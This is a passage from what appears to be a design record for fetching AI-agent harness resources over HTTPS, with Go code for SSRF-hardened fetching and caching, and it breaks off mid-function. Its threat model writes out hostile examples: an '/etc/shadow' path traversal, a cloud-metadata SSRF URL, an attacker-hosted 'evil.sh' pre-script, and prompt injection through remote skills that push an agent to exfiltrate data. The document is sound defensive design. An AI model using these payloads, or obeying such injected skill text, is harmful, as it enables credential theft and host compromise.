# Universal Harness Access

## Problem Statement

Harnesses, agents, skills, and policies are currently local-only resources resolved via relative paths within a `.fullsend` directory structure. This creates barriers to sharing, composition, and decentralized evolution of agent capabilities.

**Goal:** Make harnesses and all resources they reference universally accessible via HTTP(S) URLs, absolute paths, or relative paths, with transitive closure applying to all dependencies.

**Desired state:** An organization can run:

```bash
fullsend run https://github.com/fullsend-ai/library/harness/rust-linter.yaml
```

And the runner will:
1. Fetch the harness definition
2. Parse it to discover referenced resources (agent, skills, policies, scripts)
3. Recursively fetch any URL-referenced dependencies
4. Validate integrity and apply security policies
5. Provision the sandbox and execute the agent

All without requiring a local copy of the harness or its dependencies.

## Current State

From ADR-0024, harnesses reference resources via relative paths:

```yaml
# harness/code.yaml
agent: agents/code.md
policy: policies/code.yaml
skills:
  - skills/code-implementation
pre_script: scripts/pre-code.sh
post_script: scripts/post-code.sh
host_files:
  - src: env/gcp-vertex.env
    dest: /tmp/workspace/.env.d/gcp-vertex.env
```

Resolution logic (`internal/harness/harness.go`):
- `ResolveRelativeTo(baseDir)` converts relative paths to absolute paths
- Prevents directory traversal (e.g., `../../etc/shadow`)
- All paths must resolve within the `.fullsend` directory tree
- No network fetches; all resources must exist locally

Skills are directories with a `SKILL.md` file. Policies are OpenShell YAML files. Agent definitions are Markdown files with YAML frontmatter.

## Proposed Design

### Universal Resource Identifiers

Every path field in the harness schema accepts three forms:

1. **Relative path:** `agents/code.md` → resolved against `.fullsend` base directory
2. **Absolute path:** `/opt/fullsend/agents/code.md` → used as-is
3. **HTTPS URL:** `https://github.com/fullsend-ai/library/agents/code.md` → fetched and cached

Examples (note: `#sha256=...` hash fragments omitted for brevity; all remote URLs require integrity hashes in practice):

```yaml
# Mix local and remote resources
agent: https://github.com/fullsend-ai/library/agents/code.md
policy: policies/local-code-policy.yaml  # local override
skills:
  - https://github.com/fullsend-ai/skills/rust-conventions/SKILL.md
  - skills/org-specific-skill  # local skill
pre_script: scripts/pre-code.sh  # scripts must be local (security)
```

### Resource Types and URL Support

| Resource Type | URL Supported? | Rationale |
|---------------|----------------|-----------|
| Agent definition (`.md`) | ✅ Yes | Declarative; validated by schema |
| Policy (`.yaml`) | ✅ Yes | Declarative; validated by schema |
| Skill (`SKILL.md`) | ✅ Yes | Declarative; scanned for injection |
| Schema (`.json`) | ✅ Yes | Declarative; validated before use |
| Pre/post scripts (`.sh`) | ❌ No | Executable on host; must be local |
| Host files (certs, env) | ❌ No | Configuration; must be local |
| Container images | ✅ Yes (already) | Fetched via container registry |
| API server scripts | ❌ No | Executable; must be local |
| Validation scripts | ❌ No | Executable; must be local |

**Principle:** Declarative resources (agent definitions, skills, policies, schemas) can be remote. Executable resources (scripts, binaries) must be local to preserve auditability and prevent direct code execution from untrusted sources.

**Trade-off:** This means the `.fullsend` repository will still contain local copies of pre/post scripts, validation scripts, and other executable resources. For organizations with many scripts, updates to upstream scripts will still produce "wall of text" diffs when the local copies are updated.

**Mitigations:**
- **Vendoring with lock files:** Use a lock file (similar to `package-lock.json`) to pin script URLs and hashes. A `fullsend vendor` command updates local copies and the lock file. Diffs show only the lock file changes (URL and hash updates) rather than the full script content.
- **Future:** If URL-sourced scripts are permitted in the future, they would run in a heavily restricted sandbox with no access to secrets, no network access, and no filesystem writes outside `/tmp`. This shifts the security boundary from "local = trusted" to "sandboxed = constrained regardless of source."

For now, the recommended approach is vendoring with lock files for scripts that change frequently, and direct local scripts for those that are stable.

### Relative Path Resolution for URL-Referenced Resources

When a harness or resource is fetched from a URL, relative paths within that resource are resolved relative to the URL's base path, not the local `.fullsend` directory.

**Path traversal protection:** URL-based relative paths follow RFC 3986 semantics, including `../` traversal. Example:

A skill at `https://github.com/fullsend-ai/library/skills/rust/SKILL.md` referencing:

```yaml
policy: ../../../../attacker-org/evil-repo/policy.yaml
```

Resolves (after normalization) to: `https://github.com/attacker-org/evil-repo/policy.yaml`

This passes the domain allowlist check (`github.com` is allowed), but **fails** the URL prefix check if `allowed_remote_resources` contains:

```yaml
allowed_remote_resources:
  - https://github.com/fullsend-ai/library/
```

The normalized URL `https://github.com/attacker-org/evil-repo/policy.yaml` does not match prefix `https://github.com/fullsend-ai/library/`, so the fetch is rejected. **The prefix check operates on the normalized URL path** (after resolving `.` and `..`), not the raw reference string. This prevents cross-path traversal attacks.

**Example 1: Harness fetched from URL**
```yaml
# Harness at: https://github.com/fullsend-ai/harnesses/code.yaml
agent: agents/code.md                    # → https://github.com/fullsend-ai/harnesses/agents/code.md
policy: ../policies/code-policy.yaml     # → https://github.com/fullsend-ai/policies/code-policy.yaml
skills:
  - skills/rust-linting/SKILL.md         # → https://github.com/fullsend-ai/harnesses/skills/rust-linting/SKILL.md
```

**Example 2: Skill fetched from URL**
```yaml
# Skill at: https://github.com/fullsend-ai/skills/rust-conventions/SKILL.md
---
dependencies:
  - ../common/cargo-integration/SKILL.md  # → https://github.com/fullsend-ai/skills/common/cargo-integration/SKILL.md
policy: policies/rust-sandbox.yaml        # → https://github.com/fullsend-ai/skills/rust-conventions/policies/rust-sandbox.yaml
---
```

**Resolution algorithm:**
1. If the path is absolute (`/opt/...`): use as-is (local file)
2. If the path is a URL (`https://...`): use as-is (remote resource)
3. If the path is relative (`agents/...` or `../other`):
   - If the containing resource is a URL: resolve relative to the URL's base (URL path semantics)
   - If the containing resource is local: resolve relative to `.fullsend` directory (filesystem semantics)

**Implication:** A harness author publishing a harness at `https://example.com/harnesses/code.yaml` can use relative paths to reference co-located resources, making the harness portable without hardcoding full URLs. Consumers can fetch the entire harness tree by referencing a single top-level URL.

**Security note:** URL-based relative path resolution follows RFC 3986 (URI Generic Syntax) semantics, including path traversal (`../`). The SSRF protection layer validates that resolved URLs still match allowed domain prefixes after traversal.

### Transitive Closure

A URL-referenced skill can itself reference other resources:

```yaml
# https://github.com/fullsend-ai/skills/rust-conventions/SKILL.md
---
name: rust-conventions
policy: https://github.com/fullsend-ai/policies/rust-sandbox.yaml
dependencies:
  - https://github.com/fullsend-ai/skills/cargo-integration/SKILL.md
---
# skill content
```

The runner must:
1. Parse the skill to extract its `policy` and `dependencies` references
2. Recursively fetch and validate those resources
3. Build a complete dependency graph before sandbox creation

This applies to all resource types: agents can reference skills, skills can reference policies, policies can reference schemas. The runner resolves the full transitive closure.

### Content-Addressed Caching

Fetched resources are cached in the repository's workspace using content addressing:

```
.fullsend-cache/resources/
  sha256/
    abc123.../
      metadata.json       # {url, fetch_time, content_type, headers}
      content             # the actual fetched content
```

**Cache location:** The cache is stored in the repository's workspace (`.fullsend-cache/` directory). In ephemeral CI/CD environments like GitHub Actions, the cache is rebuilt on each run unless the platform's native caching mechanisms (e.g., GitHub Actions cache, GitLab CI cache) are used to persist it across workflow runs.

**Version control:** The `.fullsend-cache/` directory should be added to `.gitignore` to prevent cache artifacts from being committed. The cache is ephemeral and rebuilt as needed; committing it would bloat the repository and serve no purpose.

Cache key: `SHA256(content)`
Lookup: Cache is content-addressed by `SHA256(content)` — two URLs serving identical content share a cache entry.

**Why content-addressed?** If two different URLs serve identical content, they share a cache entry. This deduplicates storage and makes integrity verification uniform.

**Cache TTL:** Since all remote resources require hash pinning (see "Mandatory hash pinning" under Integrity Verification), all cached entries are content-addressed and immutable. Cache entries never expire based on time. To update a remote resource, the upstream maintainer must change the content (which produces a new SHA256 hash) and update harness references to use the new hash.

**Offline mode:** `fullsend run --offline <harness>` disables network fetches. If any required resource is not in cache, the run fails. Useful for CI environments with no internet access.

### Integrity Verification

All remote resource URLs must include an integrity hash as a fragment:

```yaml
agent: https://github.com/fullsend-ai/library/agents/code.md#sha256=abc123...
```

When present, the runner:
1. Fetches the resource
2. Computes `SHA256(content)`
3. Compares to the declared hash
4. Rejects if mismatch

**Mandatory hash pinning:** All remote resources must include a SHA256 integrity hash in the URL fragment (`#sha256=...`). URLs without hashes are rejected with an error. This requirement applies uniformly to all remote resources regardless of source (fullsend-ai repositories, community sources, or external URLs).

### SSRF Protection

The URL fetch mechanism must prevent Server-Side Request Forgery attacks.

**Implemented defenses:**

1. **Protocol allowlist:** Only `https://` permitted. Reject all other protocols including insecure HTTP (`http://`) and non-HTTP protocols (`ftp://`, `file://`, `gopher://`, etc.).
2. **Domain allowlist:** Configurable in `config.yaml`:
   ```yaml
   security:
     remote_resources:
       allowed_domains:
         - github.com              # Exact match only
         - "*.github.io"           # Explicit wildcard: matches any subdomain
         - example.org             # User-configured allowed domain
       # Reject all others
   ```
   **Subdomain matching:** By default, domain entries match **exact hostnames only**. To allow subdomains, use explicit wildcard syntax: `*.example.com` permits `subdomain.example.com` but requires the wildcard prefix to make the security-sensitive behavior visible. This prevents accidental allowlisting of shared-hosting domains where users can register arbitrary subdomains.

   **Layered security model:** The domain allowlist is a **coarse first filter** (e.g., "allow anything from github.com"). The `allowed_remote_resources` URL prefix allowlist (per-harness) is the **fine-grained security boundary** (e.g., "allow only https://github.com/fullsend-ai/skills/"). Both layers must pass for a resource to be fetched.
3. **No redirects:** HTTP 3xx responses are rejected. The URL must return 200 OK directly.
4. **Internal IP rejection:** Refuse to fetch from:
   - `0.0.0.0/8` (current network — `curl http://0.0.0.0:8080` hits localhost on Linux)
   - `127.0.0.0/8` (loopback)
   - `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (RFC 1918 private)
   - `100.64.0.0/10` (Carrier-Grade NAT / shared address space, RFC 6598)
   - `169.254.0.0/16` (link-local)
   - `198.18.0.0/15` (benchmark testing, RFC 2544)
   - `fc00::/7` (IPv6 ULA)
   - `::1` (IPv6 loopback)
   - IPv4-mapped IPv6 addresses (e.g., `::ffff:127.0.0.1` can bypass IPv4-only checks)
5. **DNS rebinding protection (REQUIRED):** To prevent DNS rebinding attacks, the implementation MUST:
   - Resolve the domain to IP addresses before making the HTTP request
   - Validate all returned IPs against the internal IP blocklist
   - Use a custom `http.Transport` with `DialContext` that pins the connection to the pre-validated IP, preventing re-resolution during the request
   - Reject if any resolved IP is internal

   **Rationale:** Without connection pinning, an attacker-controlled DNS server can return a public IP during initial validation, then return an internal IP when the HTTP client re-resolves the hostname during connection establishment. The custom `DialContext` eliminates this TOCTOU vulnerability by using only the pre-validated IP.

6. **Timeout:** 30-second timeout on all fetches. No long-lived connections.
7. **Size limit:** Reject responses larger than 10 MB. Agents, skills, and policies should be small.

**Implementation:** New package `internal/fetch/` provides `FetchURL(url string, policy FetchPolicy) ([]byte, error)` with all defenses built in.

### Security Scanning for Remote Resources

All remote resources (agents, skills, policies) pass through the same security scanners as local resources:

- **Unicode normalization** (detect homoglyph attacks)
- **Context injection detection** (adversarial prompt patterns)
- **SSRF validation** (if the resource contains URLs, validate them)
- **Secret redaction** (reject resources containing secrets)
- **LLM Guard** (ML-based prompt injection detection)

From ADR-0024, these scanners are enabled by default with fail-closed semantics. Remote resources are scanned **before** being written to the cache, so a malicious resource is rejected at fetch time, not at use time.

**Remote resources are subject to stricter policies than local resources:**

| Check | Local Resource | Remote Resource |
|-------|----------------|-----------------|
| Schema validation | Required | Required |
| Unicode normalization | Required | Required |
| Context injection scan | Optional | **Required (no opt-out)** |
| LLM Guard threshold | 0.92 (configurable) | **0.95 (higher bar)** |
| Secret redaction | Required | Required |

This reflects the higher risk of remote resources: an attacker who controls a URL can inject content, whereas local resources are org-controlled.

### Dependency Graph and Resolution

The runner builds a directed acyclic graph (DAG) of all resources before execution:

```
harness/code.yaml
  ├─ agents/code.md (local)
  │   └─ (no dependencies)
  ├─ policies/code.yaml (local)
  │   └─ (no dependencies)
  ├─ skills/code-implementation (local)
  │   └─ (no dependencies)
  └─ https://github.com/fullsend-ai/skills/rust-conventions/SKILL.md
      ├─ https://github.com/fullsend-ai/policies/rust-sandbox.yaml
      └─ https://github.com/fullsend-ai/skills/cargo-integration/SKILL.md
          └─ (no dependencies)
```

Resolution algorithm:

1. Parse the harness YAML to extract all references
2. For each reference:
   - If local path, validate it exists
   - If URL, fetch and cache
3. Parse fetched resources to extract their references
4. Repeat step 2 for new references (depth-first traversal)
5. Detect cycles (if skill A references skill B, and skill B references skill A, reject)
6. Fail if any resource cannot be fetched or validated

**Output:** A `ResolvedHarness` struct containing absolute paths or cache paths for all resources.

**Implementation:** New package `internal/resolve/` provides `ResolveHarness(h *harness.Harness) (*ResolvedHarness, error)`.

### Runtime Dependency Loading (Future)

The current design requires all dependencies to be declared in the harness. A future enhancement would allow agents to discover and load resources at runtime:

```markdown
# Agent encounters unfamiliar code
The agent uses Bash to run: fullsend-fetch-skill rust-conventions
The runner fetches the skill if it matches allowed_remote_resources
```

This requires:

1. **Runtime fetch API:** A `fullsend-fetch-skill` binary available in the sandbox, which sends a fetch request to the runner over a Unix socket.
2. **Access policy enforcement:** The harness declares `allowed_remote_resources: ["https://github.com/fullsend-ai/skills/"]`. Runtime fetches are allowed only if the URL matches a declared prefix.
3. **Audit logging:** All runtime fetches are logged with the agent's trace ID.

**Security concern:** This expands the attack surface. An attacker who can manipulate agent input (e.g., via a crafted issue body) could trick the agent into fetching a malicious skill. Mitigations:

- Runtime fetch is **opt-in** via `allow_runtime_fetch: true` in the harness
- All fetched resources go through the same validation
- Fetch requests are rate-limited (max 10 per agent run)
- Anomalous fetch patterns trigger alerts

**Status:** Not implemented in initial design. Tracked in a future issue.

### Access Policy Model

The key challenge: **how do access policies work when agents don't know what they need until runtime?**

Proposed model (two-phase):

**Phase 1: Static declaration (implemented first)**

The harness declares all allowed remote resource prefixes:

```yaml
# harness/code.yaml
agent: agents/code.md
allowed_remote_resources:
  - https://github.com/fullsend-ai/library/
  - https://github.com/myorg/agent-resources/
skills:
  - https://github.com/fullsend-ai/library/skills/rust-conventions/SKILL.md
```

The runner enforces:
- All URL references in the harness must match an `allowed_remote_resources` prefix
- Transitive dependencies must also match an allowed prefix
- No runtime fetches are allowed (agent cannot fetch new resources during execution)

**Phase 2: Runtime fetch with policy (future)**

The harness declares allowed prefixes, and the agent can fetch resources at runtime if they match:

```yaml
# harness/code.yaml
agent: agents/code.md
allowed_remote_resources:
  - https://github.com/fullsend-ai/library/
allow_runtime_fetch: true
max_runtime_fetches: 10
```

During execution, the agent can fetch `https://github.com/fullsend-ai/library/skills/python-linting/SKILL.md` because it matches an allowed prefix. The runner validates and caches it.

**Audit:** All fetches (static and runtime) are logged:

```json
{
  "trace_id": "abc123",
  "fetch_time": "2026-05-07T12:34:56Z",
  "url": "https://github.com/fullsend-ai/library/skills/rust-conventions/SKILL.md",
  "sha256": "def456...",
  "fetch_type": "static",  // or "runtime"
  "allowed_by": "allowed_remote_resources[0]"
}
```

### Inheritance and Overrides

From ADR-0024, the `.fullsend` directory supports inheritance:

- Fullsend ships defaults
- Org `.fullsend` repo overlays or adds resources
- Per-repo `.fullsend/` overrides individual files

With URL support, an org can:

1. Use an upstream harness as-is:
   ```yaml
   # .fullsend/harness/rust-linter.yaml
   agent: https://github.com/fullsend-ai/library/agents/rust-linter.md
   ```

2. Override specific resources:
   ```yaml
   # .fullsend/harness/rust-linter.yaml
   agent: https://github.com/fullsend-ai/library/agents/rust-linter.md
   policy: policies/org-rust-policy.yaml  # local override
   ```

3. Per-repo override:
   ```
   my-repo/.fullsend/policies/org-rust-policy.yaml  # repo-specific policy
   ```

The resolution order remains: fullsend defaults → org `.fullsend` → per-repo `.fullsend`. URLs are resolved before inheritance—if the org harness references a URL, that URL is fetched regardless of whether fullsend's default had a local file.

## Security Implications

### Threat: Compromised URL Serves Malicious Content

**Attack:** An attacker gains control of `https://github.com/user/library/agents/code.md` and replaces it with a malicious agent definition designed to exfiltrate secrets or inject backdoors.

**Mitigations:**

1. **Integrity pinning:** Require `#sha256=...` hashes for all production harnesses. A modified resource will fail hash validation.
2. **Security scanning:** All fetched resources are scanned for injection patterns. A malicious agent definition must pass LLM Guard at a higher threshold (0.95 vs 0.92 for local).
3. **Output validation (ADR-0022):** Even if a malicious agent runs, its output is validated against a schema. Non-compliant output is rejected.
4. **Audit logging:** All fetched URLs are logged. Anomaly detection can flag unexpected URL changes.

**Residual risk:** If the attacker can produce a malicious agent that passes all scanners **and** produces schema-compliant output, it can succeed. This is the same risk as a malicious local agent—URL support does not introduce new risk here, it just extends the attack surface.

### Threat: Dependency Confusion

**Attack:** An attacker publishes a malicious skill at `https://attacker.com/skills/common-name` and tricks a harness into referencing it instead of the legitimate `https://fullsend.ai/skills/common-name`.

**Mitigations:**

1. **Explicit URLs:** Harnesses reference full URLs, not package names. There is no auto-resolution of "skill:common-name" to a URL (unlike npm, where `require('express')` resolves to the npm registry).
2. **Domain allowlist:** Org policy restricts allowed domains. `attacker.com` would be rejected unless explicitly allowed.
3. **Lock files (future):** A `harness.lock` file pins exact URLs and hashes for all transitive dependencies. Deviations trigger alerts.

### Threat: SSRF via Runner

**Attack:** An attacker crafts a harness that references `https://169.254.169.254/latest/meta-data/` (AWS metadata service) to exfiltrate cloud credentials.

**Mitigations:**

1. **Internal IP rejection:** The fetch mechanism refuses to connect to internal IPs (see SSRF Protection above).
2. **DNS rebinding protection:** Resolve domain to IP, check IP before connecting.
3. **No redirects:** A public URL cannot redirect to an internal IP.

### Threat: Prompt Injection via Malicious Skill

**Attack:** A URL-fetched skill contains adversarial instructions designed to manipulate the agent into ignoring security guardrails or exfiltrating data.

**Mitigations:**

1. **LLM Guard with higher threshold:** Remote skills are scanned at threshold 0.95 (vs 0.92 for local).
2. **Context injection detection:** Skills are scanned for known adversarial patterns.
3. **Sandbox isolation:** Skills run inside the sandbox with limited network access. They cannot directly exfiltrate data—they must produce output, which is validated.
4. **Output validation:** Even if the skill manipulates the agent, the output must conform to the declared schema.

### Threat: TOCTOU (Time-of-Check-Time-of-Use)

**Attack:** A resource is fetched and validated, but the remote server changes it between fetch and use.

**Mitigations:**

1. **Content-addressed caching:** Once fetched, the resource is cached immutably. The cache key is the content hash. The runner never re-fetches during a single run.
2. **Mandatory hash pinning:** All remote resources must include integrity hashes (see "Mandatory hash pinning" under Integrity Verification). Since the hash is part of the URL, any content change requires updating the harness to reference the new hash, making TOCTOU attacks ineffective.

### Threat: Malicious Script Execution

**Attack:** A harness references `pre_script: https://attacker.com/evil.sh`, which runs on the runner host with full privileges.

**Mitigations:**

1. **Scripts must be local:** Pre/post scripts, validation scripts, and API server scripts cannot be URLs. This is enforced at schema validation time.
2. **If this restriction is ever relaxed:** URL-sourced scripts must run in a restricted sandbox (separate from the agent sandbox) with no access to secrets, no network, no filesystem writes outside `/tmp`.

## Implementation Changes

### 1. Harness Schema Extension

Add `allowed_remote_resources` to the harness schema:

```yaml
# harness/code.yaml (new schema)
agent: agents/code.md
allowed_remote_resources:
  - https://github.com/fullsend-ai/library/
  - https://github.com/myorg/agent-resources/
skills:
  - https://github.com/fullsend-ai/library/skills/rust-conventions/SKILL.md
```

**File:** `internal/harness/harness.go`

```go
type Harness struct {
    // existing fields...
    AllowedRemoteResources []string `yaml:"allowed_remote_resources,omitempty"`
}

func (h *Harness) Validate(orgAllowlist []string) error {
    // existing validation...

    // Validate allowed_remote_resources entries are HTTPS URLs with trailing slashes
    for _, prefix := range h.AllowedRemoteResources {
        u, err := url.Parse(prefix)
        if err != nil || u.Scheme != "https" {
            return fmt.Errorf("allowed_remote_resources entry %q must be an HTTPS URL", prefix)
        }
        if !strings.HasSuffix(prefix, "/") {
            return fmt.Errorf("allowed_remote_resources entry %q must end with / to prevent prefix confusion attacks", prefix)
        }
    }

    // Validate harness-level allowed_remote_resources is a subset of org-level allowlist
    // (per ADR-0038 lines 254-258: prevents insider attacks by requiring CODEOWNERS approval
    // for org-level config.yaml changes before new domains can be referenced)
    for _, harnessPrefix := range h.AllowedRemoteResources {
        found := false
        for _, orgPrefix := range orgAllowlist {
            if harnessPrefix == orgPrefix {
                found = true
                break
            }
        }
        if !found {
            return fmt.Errorf("harness allowed_remote_resources entry %q is not in org-level allowlist", harnessPrefix)
        }
    }

    // Validate that all URL references match allowed prefixes
    for _, skill := range h.Skills {
        if isURL(skill) && !h.matchesAllowedPrefix(skill) {
            return fmt.Errorf("skill URL %q does not match allowed_remote_resources", skill)
        }
    }
    // ... repeat for agent, policy, etc.
}
```

### 2. URL Detection and Classification

**File:** `internal/harness/url.go` (new)

```go
package harness

import (
    "net/url"
    "path/filepath"
    "strings"
)

// IsURL returns true if s is a valid HTTPS URL.
// Only https:// URLs are accepted for remote resources. http:// URLs are rejected
// to avoid confusion and provide clear error messages.
// Rejects malformed URLs (empty host, userinfo, etc.)
func IsURL(s string) bool {
    u, err := url.Parse(s)
    if err != nil || u.Scheme != "https" {
        return false
    }
    // Reject malformed URLs that url.Parse accepts but shouldn't be allowed:
    // - Empty host (https:, https://, https:///path)
    // - Userinfo (e.g., https://user:pass@host/ - credentials in URL)
    // Note: url.Parse sets u.User for standard userinfo forms (https://user@host/), but may
    // not catch all edge cases (e.g., https://@host/ on some Go versions). Production
    // implementation should add strings.Contains(s, "@") check before hostname validation
    // as belt-and-suspenders defense.
    if u.Host == "" || u.User != nil {
        return false
    }
    // Validate hostname is non-empty (u.Hostname() returns "" for malformed hosts)
    if u.Hostname() == "" {
        return false
    }
    return true
}

// isAbsPath returns true if s is an absolute file path.
func isAbsPath(s string) bool {
    return filepath.IsAbs(s)
}

// isRelPath returns true if s is a relative file path.
func isRelPath(s string) bool {
    return !IsURL(s) && !isAbsPath(s)
}

// ParseIntegrityHash extracts the SHA256 hash from a URL fragment.
// Example: https://example.com/file.md#sha256=abc123... -> "abc123..."
// Returns an error if the hash is not a valid 64-character lowercase hex string.
func ParseIntegrityHash(rawURL string) (urlWithoutHash, hash string, hasHash bool) {
    u, err := url.Parse(rawURL)
    if err != nil {
        return rawURL, "", false
    }
    if u.Fragment == "" {
        return rawURL, "", false
    }
    if !strings.HasPrefix(u.Fragment, "sha256=") {
        return rawURL, "", false
    }
    hash = strings.TrimPrefix(u.Fragment, "sha256=")

    // Validate hash format: must be exactly 64 lowercase hex characters
    // This prevents path traversal attacks like #sha256=../../etc/shadow
    if len(hash) != 64 {
        return rawURL, "", false
    }
    for _, c := range hash {
        if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
            return rawURL, "", false
        }
    }

    u.Fragment = ""
    return u.String(), hash, true
}
```

### 3. Resource Fetcher with SSRF Protection

**File:** `internal/fetch/fetch.go` (new)

```go
package fetch

import (
    "context"
    "crypto/sha256"
    "encoding/hex"
    "fmt"
    "io"
    "net"
    "net/http"
    "net/url"
    "strings"
    "time"
)

type FetchPolicy struct {
    AllowedDomains []string
    MaxSizeBytes   int64
    Timeout        time.Duration
    MaxDepth       int // Maximum depth for transitive dependencies
    MaxResources   int // Maximum total resources to fetch
    Offline        bool // If true, disable network fetches (use cache only)
}

var DefaultPolicy = FetchPolicy{
    AllowedDomains: []string{"github.com", "gitlab.com"},
    MaxSizeBytes:   10 * 1024 * 1024, // 10 MB
    Timeout:        30 * time.Second,
    MaxDepth:       10, // Maximum recursion depth for dependencies
    MaxResources:   50, // Maximum total resources fetched per harness
}
// Note: Organizations configure allowed_remote_resources in config.yaml.
// The default shipped configuration includes "https://github.com/fullsend-ai/library/"
// but this carries no special privilege - it's user-editable.

// FetchURL fetches a URL with SSRF protection and returns the content.
func FetchURL(ctx context.Context, rawURL string, policy FetchPolicy) ([]byte, error) {
    u, err := url.Parse(rawURL)
    if err != nil {
        return nil, fmt.Errorf("invalid URL: %w", err)
    }

    // 1. Only HTTPS allowed
    if u.Scheme != "https" {
        return nil, fmt.Errorf("only HTTPS URLs are allowed, got %s", u.Scheme)
    }

    // 2. Domain allowlist
    if !isAllowedDomain(u.Hostname(), policy.AllowedDomains) {
        return nil, fmt.Errorf("domain %s is not in allowed list", u.Hostname())
    }

    // 3. Resolve DNS and check for internal IPs
    ips, err := net.LookupIP(u.Hostname())
    if err != nil {
        return nil, fmt.Errorf("DNS lookup failed: %w", err)
    }
    for _, ip := range ips {
        if isInternalIP(ip) {
            return nil, fmt.Errorf("resolved to internal IP %s (SSRF protection)", ip)
        }
    }

    // 4. Fetch with timeout and size limit
    // Extract port from URL (default 443 for HTTPS)
    port := u.Port()
    if port == "" {
        port = "443"
    }

    // DNS rebinding protection: pin connection to pre-validated IPs
    // Without this custom DialContext, client.Get() would perform a second DNS resolution,
    // which could return a different (internal) IP if attacker controls the DNS server.
    // Iterate through all validated IPs to handle IPv4/IPv6 fallback.
    client := &http.Client{
        Timeout: policy.Timeout,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse // No redirects
        },
        Transport: &http.Transport{
            DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
                // Try each validated IP in sequence (handles IPv4/IPv6 fallback)
                var lastErr error
                for _, ip := range ips {
                    conn, err := (&net.Dialer{
                        Timeout: 10 * time.Second,
                    }).DialContext(ctx, network, net.JoinHostPort(ip.String(), port))
                    if err == nil {
                        return conn, nil
                    }
                    lastErr = err
                }
                return nil, fmt.Errorf("all IPs failed: %w", lastErr)
            },
        },
    }

    // Note: client.Get(rawURL) uses the original URL with hostname in the Host header,
    // while DialContext pins to pre-validated IPs. This is intentional and required for
    // TLS SNI (Server Name Indication) and certificate validation to work correctly.
    resp, err := client.Get(rawURL)
    if err != nil {
        return nil, fmt.Errorf("fetch failed: %w", err)
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        return nil, fmt.Errorf("fetch returned %d", resp.StatusCode)
    }

    // 5. Read body with size limit
    limited := io.LimitReader(resp.Body, policy.MaxSizeBytes+1)
    content, err := io.ReadAll(limited)
    if err != nil {
        return nil, fmt.Errorf("reading response: %w", err)
    }
    if int64(len(content)) > policy.MaxSizeBytes {
        return nil, fmt.Errorf("response exceeds maximum size of %d bytes", policy.MaxSizeBytes)
    }

    return content, nil
}

// isAllowedDomain returns true if hostname matches any allowed domain.
// Supports exact matches and explicit wildcard syntax (*.example.com).
// Wildcard matching matches hostname and all sub-levels: *.example.com matches
// foo.example.com, bar.baz.example.com, etc., but NOT the bare domain
// (example.com). To allow both, add both patterns: ["example.com", "*.example.com"].
// Note: This differs from TLS wildcard certificates (RFC 6125) which only match
// single-level subdomains. The more permissive matching here is acceptable since
// the security boundary is enforced by allowed_remote_resources prefix checks.
func isAllowedDomain(hostname string, allowed []string) bool {
    for _, pattern := range allowed {
        // Explicit wildcard: *.example.com matches subdomains only
        if strings.HasPrefix(pattern, "*.") {
            domain := pattern[2:] // strip "*."
            if strings.HasSuffix(hostname, "."+domain) {
                return true
            }
        } else {
            // Exact match only
            if hostname == pattern {
                return true
            }
        }
    }
    return false
}

// Pre-parse CIDR ranges at package initialization to avoid per-call allocations
var (
    _, currentNet, _ = net.ParseCIDR("0.0.0.0/8")      // Current network (not caught by IsLoopback)
    _, cgnNet, _     = net.ParseCIDR("100.64.0.0/10")  // Carrier-Grade NAT (RFC 6598)
    _, benchNet, _   = net.ParseCIDR("198.18.0.0/15")  // Benchmark testing (RFC 2544)
)

// isInternalIP returns true if ip is an internal/reserved address that should be blocked for SSRF protection.
// This checks beyond Go's stdlib helpers to catch ranges that IsPrivate() misses.
func isInternalIP(ip net.IP) bool {
    // Normalize IPv4-mapped IPv6 addresses (::ffff:a.b.c.d) to IPv4 first
    // This prevents bypassing IPv4 checks via IPv6 representation
    if v4 := ip.To4(); v4 != nil {
        ip = v4
    }

    // Standard checks (covers loopback, RFC1918, link-local)
    if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
        return true
    }

    // Block unspecified addresses (0.0.0.0, ::)
    if ip.IsUnspecified() {
        return true
    }

    // Block multicast addresses
    if ip.IsMulticast() {
        return true
    }

    // Check additional ranges not covered by IsPrivate() (using pre-parsed CIDRs)
    if currentNet.Contains(ip) || cgnNet.Contains(ip) || benchNet.Contains(ip) {
        return true
    }

    return false
}

// ComputeSHA256 returns the hex-encoded SHA256 hash of data.
func ComputeSHA256(data []byte) string {
    hash := sha256.Sum256(data)
    return hex.EncodeToString(hash[:])
}
```

### 4. Content-Addressed Cache

**File:** `internal/fetch/cache.go` (new)

```go
package fetch

import (
    "encoding/json"
    "fmt"
    "os"
    "path/filepath"
    "time"
)

type CacheEntry struct {
    URL         string    `json:"url"`
    FetchTime   time.Time `json:"fetch_time"`
    ContentType string    `json:"content_type"`
    SHA256      string    `json:"sha256"`
}

// CachePath returns .fullsend-cache/resources/sha256/<hash>/ relative to workspace root
func CachePath(workspaceRoot, hash string) string {
    return filepath.Join(workspaceRoot, ".fullsend-cache", "resources", "sha256", hash)
}

// CacheGet retrieves cached content by hash. Returns nil if not cached.
func CacheGet(workspaceRoot, hash string) ([]byte, *CacheEntry, error) {
    dir := CachePath(workspaceRoot, hash)
    metaPath := filepath.Join(dir, "metadata.json")
    contentPath := filepath.Join(dir, "content")

    // Check metadata file exists
    if _, err := os.Stat(metaPath); os.IsNotExist(err) {
        return nil, nil, nil // not cached
    }

    // Check content file exists (handle partial cache entries from CachePut crashes)
    if _, err := os.Stat(contentPath); os.IsNotExist(err) {
        return nil, nil, nil // treat partial entry as cache miss
    }

    metaData, err := os.ReadFile(metaPath)
    if err != nil {
        return nil, nil, err
    }
    var entry CacheEntry
    if err := json.Unmarshal(metaData, &entry); err != nil {
        return nil, nil, err
    }

    content, err := os.ReadFile(contentPath)
    if err != nil {
        return nil, nil, err
    }

    // REQUIRED for Phase 1: Production implementation must re-verify integrity on every read.
    // If CachePut crashes after writing metadata but during content write, the content file
    // may exist but be truncated/corrupted. Always verify: SHA256(content) == entry.SHA256
    // This illustrative code omits the check for brevity but production must include it.

    return content, &entry, nil
}

// CachePut stores content in the cache.
// NOTE: This illustrative code writes metadata and content separately, which is not atomic.
// Production implementations should use atomic writes (write to temp file, then rename) to
// prevent partial cache entries if the process crashes between writes.
func CachePut(workspaceRoot, url string, content []byte) error {
